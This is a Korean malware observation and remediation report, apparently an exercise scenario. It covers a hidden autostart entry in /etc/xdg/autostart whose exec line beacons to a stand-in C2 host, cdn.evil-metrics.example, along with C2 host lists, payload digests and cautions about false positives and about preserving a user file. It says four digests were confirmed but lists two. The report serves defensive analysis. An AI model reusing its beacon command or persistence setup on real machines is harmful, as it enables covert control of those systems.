## 관측 보고 — 로그인마다 살아나 알려진 서버에 신호를 보내는 자동 시작 항목

감염된 Debian 계열 기계를 확보해 다음을 관측했다.

### 지속성 — 시스템 전역 자동 시작 항목

데스크톱 세션이 열릴 때 실행되는 시스템 전역 자동 시작 폴더
`/etc/xdg/autostart/` 에 항목 하나가 등록돼 있다.

```
/etc/xdg/autostart/cache-sync.desktop           ← 검체가 만들었다
  실행       /opt/.cache-9f2/agent.bin --beacon https://cdn.evil-metrics.example/v2/ping --key 9f2
  표시       숨김 (메뉴에 나오지 않는다)
```

이름(`cache-sync`)은 시스템 구성 요소처럼 지었고, 표시 이름도 *"Cache
synchronisation"* 이라 무해해 보인다. **이름과 모양으로는 가릴 수 없다** — 아래
정상 항목과 같은 틀이다.

같은 폴더에 정상 자동 시작 항목이 하나 더 있다. **손대면 안 된다.**

```
/etc/xdg/autostart/vendor-update.desktop        ← 정상. 남아야 한다
  실행       /opt/vendor-tools/update.sh --server https://updates.vendor.example/api
  표시       숨김
```

둘을 가르는 것은 **실행 파일이 어디 있는가**와 **어느 서버에 붙는가**뿐이다.

### 명령 통제 서버

검체는 위 실행 줄에 적힌 주소로 주기적으로 신호를 보낸다. 위협 정보 팀이 이
계열이 쓰는 서버를 셋 확인해 주었다.

```
cdn.evil-metrics.example
api.evil-metrics.example
relay.evil-metrics.example
```

이 기계에서는 첫 번째만 관측됐다. 변종은 나머지 둘 중 하나를 쓴다.

### 페이로드

`/opt/.cache-9f2/` 안에 파일이 셋 있다. **둘이 검체이고 하나는 사용자 파일이다.**

```
agent.bin     51,200 바이트   검체 — 자동 시작 항목이 띄우는 실행 파일
helper.so     24,576 바이트   검체 — 실행 파일이 적재하는 라이브러리
notes.txt        640 바이트   사용자가 둔 메모. 남아야 한다
```

폴더 이름(`.cache-9f2`)의 꼬리는 감염마다 바뀐다. 그리고 **사용자 파일이 검체와
같은 폴더에 섞여 있다** — 폴더째 지우거나 폴더 안을 통째로 격리하면 그 메모가
함께 사라진다.

위협 정보 팀이 이 계열의 검체 다이제스트(SHA-256)를 넷 확인해 주었다.

```

384670229c221ff5384c8b7691d711efe8763a41c48490f184727d334e95f5fe
7a1c0e4d9b2f6853a0c7e1b4d8f2a6c9e3b5d7f1a4c8e0b2d6f9a3c5e7b1d4f8

```

이 기계의 두 파일은 그중 둘과 정확히 일치한다.

```
agent.bin   →  목록의 첫째와 일치
helper.so   →  목록의 둘째와 일치
notes.txt   →  목록에 없다
```

나머지 둘은 변종의 것이라 이 기계에는 없다.

### 오탐 위험 — 반드시 읽을 것

**`/opt` 는 서드파티 소프트웨어가 정상으로 쓰는 자리다.** 조사한 청정 기계들에
`/opt` 아래 실행 파일과 스크립트가 여럿 있었고, 그중에는 자동 시작 항목이 자기
갱신 서버 주소를 실행 줄에 가진 것도 있었다. 자리·모양·"서버 주소가 있다" 로
가르면 그것들이 전부 걸린다.

**점으로 시작하는 폴더**도 가르는 근거가 못 된다 — `/opt` 아래 `.cache`·`.local`
류 폴더는 정상 도구도 만든다.

가려지는 것은 **목록**뿐이다: 다이제스트가 목록에 있는 파일, 목록의 서버에 붙는
자동 시작 항목.

### 치료 뒤 남아야 하는 것

- `/opt/.cache-9f2/notes.txt` — 검체와 같은 폴더에 있는 사용자 파일
- `/opt/vendor-tools/update.sh` 와 `/etc/xdg/autostart/vendor-update.desktop` —
  같은 모양의 정상 자동 시작 항목과 그 스크립트

### 되돌리기

검체 파일 둘은 지우지 말고 격리한다 — 오탐이면 되돌려야 한다. 자동 시작 항목은
그 정의를 없앤다.
